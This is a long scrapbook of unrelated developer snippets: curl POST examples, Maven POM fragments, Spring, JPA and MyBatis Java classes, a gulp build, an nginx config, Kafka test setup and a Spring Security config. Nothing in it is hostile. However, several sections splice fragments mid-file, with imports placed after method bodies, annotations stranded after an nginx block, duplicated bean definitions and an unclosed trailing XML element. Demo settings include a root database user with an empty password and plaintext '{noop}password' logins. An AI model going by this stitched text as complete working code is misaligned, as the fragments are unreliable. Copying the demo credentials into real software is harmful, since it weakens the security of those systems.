==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
curl --data '' https://example.com/resource.cgi

curl -X POST https://example.com/resource.cgi

curl --request POST https://example.com/resource.cgi

curl --tr-encoding -X POST -v -# -o output -T filename.dat \
  http://example.com/resource.cgi
  
echo '{"text": "Hello **world**!"}' | curl -d @- https://api.github.com/markdown

curl -d "username=admin&password=admin&submit=Login" --dump-header headers http://localhost/Login
curl -L -b headers http://localhost/

curl -v --data-ascii var=value http://example.com

curl http://httpbin.org/post \
    -H "User-Agent: Mozilla/2.2" \
    -F param1=hello \
    -F name=dinsdale \
    -F name=piranha
==============================================================================================================
            <plugin>
                <groupId>io.gatling</groupId>
                <artifactId>gatling-maven-plugin</artifactId>
                <version>${maven-gatling-plugin.version}</version>
                <configuration>
                    <resultsFolder>${project.build.directory}</resultsFolder>
                    <!--<runMultipleSimulations>true</runMultipleSimulations>-->
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>test</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
			
			   <dependencies>
        <!-- Gatling test library dependencies -->
        <dependency>
            <groupId>io.gatling.highcharts</groupId>
            <artifactId>gatling-charts-highcharts</artifactId>
            <version>${gatling-charts.version}</version>
            <scope>test</scope>
        </dependency>
    </dependencies>
	
	
==============================================================================================================
<profiles>
  <profile>
    <id>os-properties</id>
    <properties>
      <os.detected.name>linux</os.detected.name>
      <os.detected.arch>x86_64</os.detected.arch>
      <os.detected.classifier>linux-x86_64</os.detected.classifier>
    </properties>
  </profile>
</profiles>

<activeProfiles>
  <activeProfile>os-properties</activeProfile>
</activeProfiles>
==============================================================================================================
@Override
	public int compareTo(ProductImage o) {
		return new CompareToBuilder().append(getSortNo(), o.getSortNo()).toComparison();
	}
	
import java.util.List;
import java.util.Set;

import javax.persistence.EntityManager;
import javax.persistence.FlushModeType;
import javax.persistence.PersistenceContext;
import javax.persistence.criteria.CriteriaBuilder;
import javax.persistence.criteria.CriteriaQuery;
import javax.persistence.criteria.Predicate;
import javax.persistence.criteria.Root;

import com.whenling.extension.mall.product.model.Goods;
import com.whenling.extension.mall.product.model.Product;

public class ProductRepositoryImpl implements ProductRepositoryCustom {

	@PersistenceContext
	protected EntityManager entityManager;

	@Override
	public List<Product> findByGoodsWithExcludes(Goods goods, Set<Product> excludes) {
		CriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();
		CriteriaQuery<Product> criteriaQuery = criteriaBuilder.createQuery(Product.class);
		Root<Product> root = criteriaQuery.from(Product.class);
		criteriaQuery.select(root);
		Predicate restrictions = criteriaBuilder.conjunction();
		if (goods != null) {
			restrictions = criteriaBuilder.and(restrictions, criteriaBuilder.equal(root.get("goods"), goods));
		}
		if (excludes != null && !excludes.isEmpty()) {
			restrictions = criteriaBuilder.and(restrictions, criteriaBuilder.not(root.in(excludes)));
		}
		criteriaQuery.where(restrictions);
		return entityManager.createQuery(criteriaQuery).setFlushMode(FlushModeType.COMMIT).getResultList();
	}

}

@Digits(integer = 12, fraction = 3)
private static final String MOBILE_PHONE_NUMBER_PATTERN = "^$|^0{0,1}(13[0-9]|15[0-9]|14[0-9]|17[0-9]|18[0-9])[0-9]{8}$";
==============================================================================================================
import java.sql.SQLException;
import java.util.Properties;

import javax.sql.DataSource;

import org.hibernate.SessionFactory;
import org.hibernate.cfg.Environment;
import org.hibernate.jpa.HibernateEntityManagerFactory;
import org.hibernate.tool.hbm2ddl.MultipleLinesSqlCommandExtractor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.data.jpa.datatables.repository.DataTablesRepositoryFactoryBean;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseBuilder;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseType;
import org.springframework.orm.jpa.AbstractEntityManagerFactoryBean;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
import org.springframework.transaction.PlatformTransactionManager;

/**
 * Spring JavaConfig configuration for general infrastructure.
 */
@Configuration
@EnableJpaRepositories(repositoryFactoryBeanClass = DataTablesRepositoryFactoryBean.class,
    basePackages = { "org.springframework.data.jpa.datatables.model", "org.springframework.data.jpa.datatables.repository" })
public class Config {

  @Bean
  @Profile({"default", "h2"})
  public DataSource dataSource_H2() throws SQLException {
    return new EmbeddedDatabaseBuilder().setType(EmbeddedDatabaseType.H2).build();
  }

  @Bean
  @Profile("mysql")
  public DataSource dataSource_MySQL() throws SQLException {
    DriverManagerDataSource dataSource = new DriverManagerDataSource();
    dataSource.setDriverClassName("com.mysql.jdbc.Driver");
    dataSource.setUrl("jdbc:mysql://127.0.0.1/test");
    dataSource.setUsername("root");
    dataSource.setPassword("");
    return dataSource;
  }

  @Bean
  @Profile("pgsql")
  public DataSource dataSource_PostgreSQL() throws SQLException {
    DriverManagerDataSource dataSource = new DriverManagerDataSource();
    dataSource.setDriverClassName("org.postgresql.Driver");
    dataSource.setUrl("jdbc:postgresql://127.0.0.1/test");
    dataSource.setUsername("postgres");
    dataSource.setPassword("");
    return dataSource;
  }

  @Bean
  public PlatformTransactionManager transactionManager() throws SQLException {
    return new JpaTransactionManager();
  }

  @Bean
  public AbstractEntityManagerFactoryBean entityManagerFactory(DataSource dataSource)
      throws SQLException {

    HibernateJpaVendorAdapter jpaVendorAdapter = new HibernateJpaVendorAdapter();
    jpaVendorAdapter.setGenerateDdl(true);

    LocalContainerEntityManagerFactoryBean bean = new LocalContainerEntityManagerFactoryBean();
    bean.setJpaVendorAdapter(jpaVendorAdapter);
    bean.setPackagesToScan(Config.class.getPackage().getName());
    bean.setDataSource(dataSource);

    return bean;
  }

  @Bean
  public SessionFactory sessionFactory(AbstractEntityManagerFactoryBean entityManagerFactory)
      throws SQLException {
    return ((HibernateEntityManagerFactory) entityManagerFactory.getObject()).getSessionFactory();
  }

}
==============================================================================================================
var gulp = require('gulp');
var url = require('url');
var proxy = require('proxy-middleware');
var templateCache = require('gulp-angular-templatecache');
var browserSync = require("browser-sync").create();

$ = require('gulp-load-plugins')();

gulp.task('clean', function () {
    return gulp.src(['dist/', '.tmp/'])
            .pipe($.clean());
});

gulp.task('templates', function () {
    return gulp.src('app/views/**/*.html')
            .pipe(templateCache({module: 'exampleApp.templates', standalone: true}))
            .pipe($.wrap('(function () {<%=contents%>}());'))
            .pipe(gulp.dest('.tmp/scripts/'));
});

gulp.task('serve', ['templates'], function () {
    var proxyOptions = url.parse('http://localhost:9000/api');
    proxyOptions.route = '/api';
    browserSync.init({
        notify: false,
        // Customize the Browsersync console logging prefix
        logPrefix: 'WSK',
        // Allow scroll syncing across breakpoints
        //scrollElementMapping: ['main', '.mdl-layout'],
        // Run as an https by uncommenting 'https: true'
        // Note: this uses an unsigned certificate which on first access
        //       will present a certificate warning in the browser.
        // https: true,
        server: {
            baseDir: ['.tmp', 'app'],
            middleware: [proxy(proxyOptions)]
        },
        port: 3000
    });

    gulp.watch(['app/**/*.html', 'app/styles/**/*.{scss,css}', 'app/scripts/**/*.js', 'app/images/**/*'], ['templates', browserSync.reload]);
//  gulp.watch(['app/styles/**/*.{scss,css}'], ['styles', browserSync.reload]);
//  gulp.watch(['app/scripts/**/*.js'], ['lint', 'scripts']);
//  gulp.watch(['app/images/**/*'], browserSync.reload);
});

gulp.task('copy-fonts', function () {
    gulp.src(
            [
                'bower_components/font-awesome/fonts/*.*',
                'bower_components/bootstrap-material-design/fonts/*.*',
                'bower_components/bootstrap/fonts/*.*'
            ],
            {cwd: 'app/'})
            .pipe(gulp.dest('dist/fonts/'));
});

gulp.task('copy-images', function () {
    gulp.src(['images/**'],
            {cwd: 'app/'})
            .pipe($.cache($.imagemin({optimizationLevel: 5, progressive: true, interlaced: true})))
            .pipe(gulp.dest('dist/images/'));
});

gulp.task('copy-i18n', function () {
    gulp.src(['i18n/**'],{cwd: 'app/'})
            .pipe(gulp.dest('dist/i18n/'));
});

gulp.task('copy', ['copy-fonts', 'copy-images', 'copy-i18n'], function () {});

//gulp.task('less', function () {
//  return gulp.src(['bower_components/bootstrap/less/bootstrap.less', 'bower_components/font-awesome/less/font-awesome.less'])
//    .pipe($.less())
//    .pipe($.concat())
//    .pipe(gulp.dest('./tmp/styles'));
//});
//
//var sass = require('gulp-ruby-sass');
//gulp.task('sass', function() {
//    return sass('src/scss/style.scss', {style: 'compressed'})
//        .pipe(rename({suffix: '.min'}))
//        .pipe(gulp.dest('build/css'));
//});

gulp.task('usemin', ['copy'], function () {
    return gulp.src('app/index.html')
            .pipe($.usemin({
                css: [
                    $.minifyCss(),
                    'concat',
                    $.rev()
                ],
                appcss: [
                    $.minifyCss(),
                    $.rev()
                ],
                js: [
                    $.uglify(),
                    $.rev()
                ],
                ngjs: [
                    $.stripDebug(),
                    $.ngAnnotate(),
                    //'concat'
                    $.uglify(),
                    $.rev()
                ],
                tpljs: [
                    $.ngAnnotate(),
                    $.uglify(),
                    $.rev()
                ]
            }))
            .pipe(gulp.dest('dist/'));
});
// Tell Gulp what to do when we type "gulp" into the terminal
gulp.task('default', function (cb) {
    $.sequence('clean', 'templates', 'usemin')(cb);
});
==============================================================================================================
user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;

events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    keepalive_timeout  65;

    gzip  on;

    include /etc/nginx/conf.d/*.conf;

    server {
        listen 80;
        server_name atseashop.com;
        return 301 https://$host$request_uri;
    }

    server {
        listen 443;
        ssl on;
        ssl_certificate /run/secrets/revprox_cert;
        ssl_certificate_key /run/secrets/revprox_key;
        server_name atseashop.com;
        access_log /dev/stdout;
        error_log /dev/stderr;

        location / {
            proxy_pass http://appserver:8080;
        }
    }
}

    @ElementCollection
    @MapKeyColumn(name="productid")
    @Column(name = "productsordered")
    @CollectionTable(name="orderquantities", joinColumns=@JoinColumn(name="orderid"))
    Map<Integer, Integer> productsOrdered = new HashMap<Integer, Integer>();
==============================================================================================================
    public static void main(String[] args) {
        SpringApplication.run(MultipleSourceMain.class, args);
    }


    /**
     * 第一个数据源
     * @return 数据源实例
     */
    @Bean(name = "primaryDataSource")
    @Qualifier("primaryDataSource")
    @ConfigurationProperties(prefix = "spring.datasource.primary")
    public DataSource primaryDataSource() {
        return DataSourceBuilder.create().build();
    }

    /**
     * 第二个数据源
     * @return 数据源实例
     */
    @Bean(name = "secondaryDataSource")
    @Qualifier("secondaryDataSource")
    @Primary
    @ConfigurationProperties(prefix = "spring.datasource.secondary")
    public DataSource secondaryDataSource() {
        return DataSourceBuilder.create().build();
    }

    /**
     * 第一个JDBC模板
     * @param dataSource dataSource
     * @return JDBC模板
     */
    @Bean(name = "primaryJdbcTemplate")
    public JdbcTemplate primaryJdbcTemplate(
            @Qualifier("primaryDataSource") DataSource dataSource) {
        return new JdbcTemplate(dataSource);
    }

    /**
     * 第二个JDBC模板
     * @param dataSource dataSource
     * @return JDBC模板
     */
    @Bean(name = "secondaryJdbcTemplate")
    public JdbcTemplate secondaryJdbcTemplate(
            @Qualifier("secondaryDataSource") DataSource dataSource) {
        return new JdbcTemplate(dataSource);
    }
	
	import info.xiaomo.mybatis.domain.User;
import org.apache.ibatis.annotations.*;

import java.util.List;
import java.util.Map;

/**
 * @author : xiaomo
 */
@Mapper
public interface UserMapper {

    @Results({
            @Result(property = "name", column = "name"),
            @Result(property = "age", column = "age")
    })

    /**
     * 根据名字查
     * @param name
     * @return user
     */
    @Select("SELECT * FROM USER WHERE NAME = #{name}")
    User findByName(@Param("name") String name);

    /**
     * 插入
     *
     * @param name
     * @param age
     * @return
     */
    @Insert("INSERT INTO USER(NAME, AGE) VALUES(#{name}, #{age})")
    int insert(@Param("name") String name, @Param("age") Integer age);

    /**
     * 查所有
     *
     * @return
     */
    @Select("SELECT * FROM USER WHERE 1=1")
    List<User> findAll();

    /**
     * 更新
     *
     * @param user
     */
    @Update("UPDATE USER SET age=#{age} WHERE name=#{name}")
    void update(User user);

    /**
     * 删除
     *
     * @param id
     */
    @Delete("DELETE FROM USER WHERE id =#{id}")
    void delete(Long id);

    /**
     * 添加
     *
     * @param user
     * @return
     */
    @Insert("INSERT INTO USER(name, age) VALUES(#{name}, #{age})")
    int insertByUser(User user);

    /**
     * 添加
     *
     * @param map
     * @return
     */
    @Insert("INSERT INTO user(name, age) VALUES(#{name,jdbcType=VARCHAR}, #{age,jdbcType=INTEGER})")
    int insertByMap(Map<String, Object> map);

}
==============================================================================================================
import com.hellokoding.auth.model.User;
import com.hellokoding.auth.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.validation.Errors;
import org.springframework.validation.ValidationUtils;
import org.springframework.validation.Validator;

@Component
public class UserValidator implements Validator {
    @Autowired
    private UserService userService;

    @Override
    public boolean supports(Class<?> aClass) {
        return User.class.equals(aClass);
    }

    @Override
    public void validate(Object o, Errors errors) {
        User user = (User) o;

        ValidationUtils.rejectIfEmptyOrWhitespace(errors, "username", "NotEmpty");
        if (user.getUsername().length() < 6 || user.getUsername().length() > 32) {
            errors.rejectValue("username", "Size.userForm.username");
        }
        if (userService.findByUsername(user.getUsername()) != null) {
            errors.rejectValue("username", "Duplicate.userForm.username");
        }

        ValidationUtils.rejectIfEmptyOrWhitespace(errors, "password", "NotEmpty");
        if (user.getPassword().length() < 8 || user.getPassword().length() > 32) {
            errors.rejectValue("password", "Size.userForm.password");
        }

        if (!user.getPasswordConfirm().equals(user.getPassword())) {
            errors.rejectValue("passwordConfirm", "Diff.userForm.passwordConfirm");
        }
    }
}
==============================================================================================================
    @Bean
    public Jackson2ObjectMapperBuilder objectMapperBuilder(JsonComponentModule jsonComponentModule) {
   
        Jackson2ObjectMapperBuilder builder = new Jackson2ObjectMapperBuilder();
            builder
    //                .serializerByType(ZonedDateTime.class, new JsonSerializer<ZonedDateTime>() {
    //                    @Override
    //                    public void serialize(ZonedDateTime zonedDateTime, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException, JsonProcessingException {
    //                        jsonGenerator.writeString(DateTimeFormatter.ISO_ZONED_DATE_TIME.format(zonedDateTime));
    //                    }
    //                })
                .serializationInclusion(JsonInclude.Include.NON_EMPTY)
                .featuresToDisable(
                        SerializationFeature.WRITE_DATES_AS_TIMESTAMPS,
                        DeserializationFeature.FAIL_ON_IGNORED_PROPERTIES,
                        DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES
                )
                .featuresToEnable(DeserializationFeature.ACCEPT_SINGLE_VALUE_AS_ARRAY)
                .indentOutput(true)
                .modulesToInstall(jsonComponentModule);
    
        return builder;
    } 
==============================================================================================================
/**
 * <p>Copyright (c) 2014 ZhaoQian.All Rights Reserved.</p>
 * @author <a href="zhaoqianjava@foxmail.com">ZhaoQian</a>
 */
package org.zhaoqian.security.shiro.authc.token;

import org.apache.shiro.authc.UsernamePasswordToken;

/**
 * @author Credo
 * @date: 2014年8月1日
 */
public class CaptchaUsernamePasswordToken extends UsernamePasswordToken
{

	private static final long serialVersionUID = -4746028009681958929L;

	private String kaptcha;

	public CaptchaUsernamePasswordToken(String username, char[] password, boolean rememberMe, String host, String kaptcha)
	{
		super(username, password, rememberMe, host);
		this.kaptcha = kaptcha;
	}

	public String getKaptcha()
	{
		return kaptcha;
	}

	public void setKaptcha(String kaptcha)
	{
		this.kaptcha = kaptcha;
	}

}
==============================================================================================================
import org.springframework.data.domain.Pageable;
import org.springframework.data.solr.core.query.Query.Operator;
import org.springframework.data.solr.core.query.result.FacetPage;
import org.springframework.data.solr.core.query.result.HighlightPage;
import org.springframework.data.solr.repository.Facet;
import org.springframework.data.solr.repository.Highlight;
import org.springframework.data.solr.repository.Query;
import org.springframework.data.solr.repository.SolrCrudRepository;
import org.springframework.data.solr.showcase.product.model.Product;

/**
 * @author Christoph Strobl
 */
interface ProductRepository extends SolrCrudRepository<Product, String> {

	@Highlight(prefix = "<b>", postfix = "</b>")
	@Query(fields = { SearchableProductDefinition.ID_FIELD_NAME, SearchableProductDefinition.NAME_FIELD_NAME,
			SearchableProductDefinition.PRICE_FIELD_NAME, SearchableProductDefinition.FEATURES_FIELD_NAME,
			SearchableProductDefinition.AVAILABLE_FIELD_NAME }, defaultOperator = Operator.AND)
	HighlightPage<Product> findByNameIn(Collection<String> names, Pageable page);

	@Facet(fields = { SearchableProductDefinition.NAME_FIELD_NAME })
	FacetPage<Product> findByNameStartsWith(Collection<String> nameFragments, Pageable pagebale);

}
==============================================================================================================
		<executions>
					<execution>
						<goals>
							<goal>test-process</goal>
						</goals>
						<configuration>
							<outputDirectory>target/generated-sources/java</outputDirectory>
							<processor>com.querydsl.apt.jpa.JPAAnnotationProcessor</processor>
						</configuration>
					</execution>
				</executions>
==============================================================================================================
import com.hazelcast.query.Predicate;

import java.io.Serializable;
import java.util.Map;

import org.apache.shiro.session.Session;

/**
 * Hazelcast query predicate for Shiro session attributes.
 */
public class SessionAttributePredicate<T> implements
        Predicate<Serializable, Session> {

    private final String attributeName;
    private final T attributeValue;

    public SessionAttributePredicate(String attributeName, T attributeValue) {
        this.attributeName = attributeName;
        this.attributeValue = attributeValue;
    }

    public String getAttributeName() {
        return attributeName;
    }

    public T getAttributeValue() {
        return attributeValue;
    }

    @Override
    public boolean apply(Map.Entry<Serializable, Session> sessionEntry) {
        final T attribute = (T) sessionEntry.getValue().getAttribute(attributeName);
        return attribute.equals(attributeValue);
    }
}
==============================================================================================================
<build>
    <plugins>
        <plugin>
            <artifactId>maven-surefire-plugin</artifactId>
            <version>2.22.2</version>
            <configuration>
                <groups>acceptance | !feature-a</groups>
                <excludedGroups>integration, regression</excludedGroups>
            </configuration>
        </plugin>
    </plugins>
</build>
==============================================================================================================
@Component
@Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)
public class MyBean {

    @InjectRandomInt
    private int value1;

    @InjectRandomInt(min = 100, max = 200)
    private int value2;

    private int value3;

    @Override
    public String toString() {
        return "MyBean{" +
                "value1=" + value1 +
                ", value2=" + value2 +
                ", value3=" + value3 +
                '}';
    }
}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
class WebServerDemo {

    @RegisterExtension
    static WebServerExtension server = WebServerExtension.builder()
        .enableSecurity(false)
        .build();

    @Test
    void getProductList() {
        WebClient webClient = new WebClient();
        String serverUrl = server.getServerUrl();
        // Use WebClient to connect to web server using serverUrl and verify response
        assertEquals(200, webClient.get(serverUrl + "/products").getResponseStatus());
    }

}

-Djunit.jupiter.conditions.deactivate=org.junit.*DisabledCondition
==============================================================================================================
<bean id="customBeanPostProcessor" class="com.howtodoinjava.demo.processors.CustomBeanPostProcessor" />
     
<bean id="dao" class="com.howtodoinjava.demo.dao.EmployeeDAOImpl"  init-method="initBean" destroy-method="destroyBean"/>

<bean id="customBeanPostProcessor" class="com.howtodoinjava.demo.processors.CustomBeanPostProcessor" />
     
<bean id="dao" class="com.howtodoinjava.demo.dao.EmployeeDAOImpl"  init-method="initBean" destroy-method="destroyBean"/>
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
import java.time.LocalDateTime;
import java.time.ZoneOffset;

import com.amazonaws.auth.AWSCredentialsProvider;
import com.amazonaws.auth.DefaultAWSCredentialsProviderChain;
import com.amazonaws.regions.Region;
import com.amazonaws.regions.Regions;
import com.google.common.base.Supplier;
import io.searchbox.client.JestClientFactory;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.nio.client.HttpAsyncClientBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.autoconfigure.AutoConfigureAfter;
import org.springframework.boot.autoconfigure.condition.ConditionalOnBean;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.cloud.aws.core.region.RegionProvider;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.util.StringUtils;
import vc.inreach.aws.request.AWSSigner;
import vc.inreach.aws.request.AWSSigningRequestInterceptor;

/**
 * Jest Elasticsearch for signing request on AWS configuration.
 * @author Julien Roy
 */
@Configuration
@ConditionalOnClass(AWSSigner.class)
@AutoConfigureAfter(name = "org.springframework.cloud.aws.autoconfigure.context.ContextRegionProviderAutoConfiguration")
public class ElasticsearchJestAWSAutoConfiguration {

	private static final String AWS_SERVICE = "es";
	private static final Supplier<LocalDateTime> CLOCK = () -> LocalDateTime.now(ZoneOffset.UTC);

	@Autowired
	private ElasticsearchJestProperties properties;

	@Autowired
	@Qualifier("elasticsearchJestAwsRegion")
	private String regionName;

	@Bean
	@ConditionalOnMissingBean(AWSCredentialsProvider.class)
	public AWSCredentialsProvider awsCredentialsProvider() {
		return new DefaultAWSCredentialsProviderChain();
	}

	@Bean
	public JestClientFactory jestClientFactory(AWSCredentialsProvider credentialsProvider) {

		final AWSSigner awsSigner = new AWSSigner(credentialsProvider, getRegion(), AWS_SERVICE, CLOCK);

		final AWSSigningRequestInterceptor requestInterceptor = new AWSSigningRequestInterceptor(awsSigner);
		return new JestClientFactory() {
			@Override
			protected HttpClientBuilder configureHttpClient(HttpClientBuilder builder) {
				builder.addInterceptorLast(requestInterceptor);
				return builder;
			}
			@Override
			protected HttpAsyncClientBuilder configureHttpClient(HttpAsyncClientBuilder builder) {
				builder.addInterceptorLast(requestInterceptor);
				return builder;
			}
		};
	}

	/**
	 * Return configured region if exist, else try to use auto-discovered region.
	 * @return Region name
	 */
	private String getRegion() {
		// Use specific user configuration
		if (StringUtils.hasText(properties.getAwsRegion())) {
			return properties.getAwsRegion();
		}

		return regionName;
	}

	@ConditionalOnMissingBean(name = "elasticsearchJestAwsRegion")
	@Bean(name = "elasticsearchJestAwsRegion")
	public String regionFromEC2() {

		// Try to determine current region ( work on EC2 instance )
		Region region = Regions.getCurrentRegion();
		if (region != null) {
			return region.getName();
		}

		// Nothing else , back to default
		return Regions.DEFAULT_REGION.getName();
	}

	@ConditionalOnClass(RegionProvider.class)
	@ConditionalOnBean(RegionProvider.class)
	private final static class RegionFromSpringCloudConfiguration {

		@Bean(name = "elasticsearchJestAwsRegion")
		public String regionFromSpringCloud(RegionProvider regionProvider) {

			// Try to use SpringCloudAWS region
			return regionProvider.getRegion().getName();
		}
	}
}

@Document(indexName = "test-product-index", type = "test-product-type", shards = 1, replicas = 0, refreshInterval = "-1")
==============================================================================================================
import org.springframework.validation.Errors;
import org.springframework.validation.Validator;

/**
 * @author volodymyr.tsukur
 */
public class AdValidator implements Validator {

    @Override
    public boolean supports(Class<?> clazz) {
        return Ad.class.isAssignableFrom(clazz);
    }

    @Override
    public void validate(Object target, Errors errors) {
        Ad ad = (Ad) target;
        if (ad.getAmount().intValue() <= 0) {
            errors.rejectValue("amount", "Ad.amount.not.positive", "Amount should be positive");
        }
    }

}

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpMethod;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

public class SessionHandlerInterceptor extends HandlerInterceptorAdapter {

    @Autowired
    private SessionData sessionData;

    @Override
    public boolean preHandle(final HttpServletRequest request, final HttpServletResponse response, final Object handler) throws Exception {
        // Register functionality is authorized for anonymous user
    	if (request.getMethod().equals(HttpMethod.POST.toString()) && request.getRequestURI().indexOf("/account") > 0) {
        	return true;
        }
    	
    	if (sessionData.getUser() == null) {
        	response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Unauthorized");
            return false;
        } else {
            return true;
        }
    }
}

    @Id
    @GenericGenerator(name="snowflake",strategy = SnowflakeGenerator.TYPE)
    @GeneratedValue(generator = "snowflake")
    private PK id;
==============================================================================================================
<?xml version="1.0" encoding="utf-8" ?>
<sqls xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns="http://www.slyak.com/schema/templatequery"
      xsi:schemaLocation="http://www.slyak.com/schema/templatequery http://www.slyak.com/schema/templatequery.xsd">

    <sql name="findByContent">
        <![CDATA[
          SELECT * FROM t_sample WHERE 1=1
          <#if content??>
            AND content LIKE :content
          </#if>
        ]]>
    </sql>
    <sql name="countContent">
        <![CDATA[
          SELECT count(*) FROM t_sample WHERE 1=1
          <#if content??>
            AND content LIKE :content
          </#if>
        ]]>
    </sql>
    <sql name="findDtos">
        <![CDATA[
          SELECT id,content as contentShow FROM t_sample
        ]]>
    </sql>
    <sql name="findByTemplateQueryObject">
        <![CDATA[
          SELECT * FROM t_sample WHERE 1=1
          <#if content??>
            AND content LIKE :content
          </#if>
        ]]>
    </sql>
</sqls>
==============================================================================================================
import org.springframework.data.annotation.Id;
import org.springframework.data.annotation.Version;
import org.springframework.data.elasticsearch.annotations.Document;

@Document(indexName = "topqueries", type = "custquery", indexStoreType = "fs", shards = 1, replicas = 0, refreshInterval = "-1")
public class CustomerTopQuery {

	@Id
	private String id;
	@Version
	private Long version;

	private Long customerId;

	private String queryString;

	private int count;

	public String getId() {
		return id;
	}

	public void setId(String id) {
		this.id = id;
	}

	public Long getVersion() {
		return version;
	}

	public void setVersion(Long version) {
		this.version = version;
	}

	public Long getCustomerId() {
		return customerId;
	}

	public void setCustomerId(Long customerId) {
		this.customerId = customerId;
	}

	public String getQueryString() {
		return queryString;
	}

	public void setQueryString(String queryString) {
		this.queryString = queryString;
	}

	public int getCount() {
		return count;
	}

	public void setCount(int count) {
		this.count = count;
	}
}
==============================================================================================================
@NamedNativeQuery(name = "Manufacturer.getAllThatSellAcoustics", 
		query = "SELECT m.id, m.name, m.foundedDate, m.averageYearlySales, m.location_id as headquarters_id, m.active "
	    + "FROM Manufacturer m "
		+ "LEFT JOIN Model mod ON (m.id = mod.manufacturer_id) "
		+ "LEFT JOIN ModelType mt ON (mt.id = mod.modeltype_id) "
	    + "WHERE (mt.name = ?)", resultClass = Manufacturer.class)
==============================================================================================================
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter-aws</artifactId>
            <version>${springcloudaws}</version>
            <optional>true</optional>
            <exclusions>
                <exclusion>
                    <groupId>com.amazonaws</groupId>
                    <artifactId>*</artifactId>
                </exclusion>
                <exclusion>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-actuator</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>com.amazonaws</groupId>
            <artifactId>aws-java-sdk-core</artifactId>
            <version>${aws}</version>
            <optional>true</optional>
        </dependency>
==============================================================================================================
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;

@Configuration
@EnableWebSecurity
public class SpringSecurityConfig extends WebSecurityConfigurerAdapter {
  @Override
  protected void configure(final AuthenticationManagerBuilder auth) throws Exception {
    auth.inMemoryAuthentication()
      .withUser("admin")
      .password("{noop}password") //{noop} makes sure that the password encoder doesn't do anything
      .roles("USER", "ADMIN") // Role of the user
      .and()
      .withUser("user")
      .password("{noop}password")
      .credentialsExpired(true)
      .accountExpired(true)
      .accountLocked(true)
      .roles("USER");
  }

  @Override
  protected void configure(final HttpSecurity http) throws Exception {
    http.authorizeRequests().antMatchers("/css/**").permitAll();
    http.authorizeRequests().anyRequest().fullyAuthenticated().and()
      .formLogin()
      .loginPage("/login")
      .failureUrl("/login?error").permitAll();
  }
}
==============================================================================================================
static {
    EmbeddedKafkaHolder.getEmbeddedKafka().addTopics(topic1, topic2);
}

private static EmbeddedKafkaRule embeddedKafka = EmbeddedKafkaHolder.getEmbeddedKafka();
==============================================================================================================
Map<String, Object> consumerProps = KafkaTestUtils.consumerProps("testT", "false", embeddedKafka);
DefaultKafkaConsumerFactory<Integer, String> cf = new DefaultKafkaConsumerFactory<Integer, String>(
        consumerProps);
Consumer<Integer, String> consumer = cf.createConsumer();
embeddedKafka.consumeFromAllEmbeddedTopics(consumer);

<int-kafka:outbound-channel-adapter id="kafkaOutboundChannelAdapter"
                                    kafka-template="template"
                                    auto-startup="false"
                                    channel="inputToKafka"
                                    topic="foo"
                                    sync="false"
                                    message-key-expression="'bar'"
                                    send-failure-channel="failures"
                                    send-success-channel="successes"
                                    error-message-strategy="ems"
                                    partition-id-expression="2">
</int-kafka:outbound-channel-adapter>

<bean id="template" class="org.springframework.kafka.core.KafkaTemplate">
    <constructor-arg>
        <bean class="org.springframework.kafka.core.DefaultKafkaProducerFactory">
            <constructor-arg>
                <map>
                    <entry key="bootstrap.servers" value="localhost:9092" />
                    ... <!-- more producer properties -->
                </map>
            </constructor-arg>
        </bean>
    </constructor-arg>
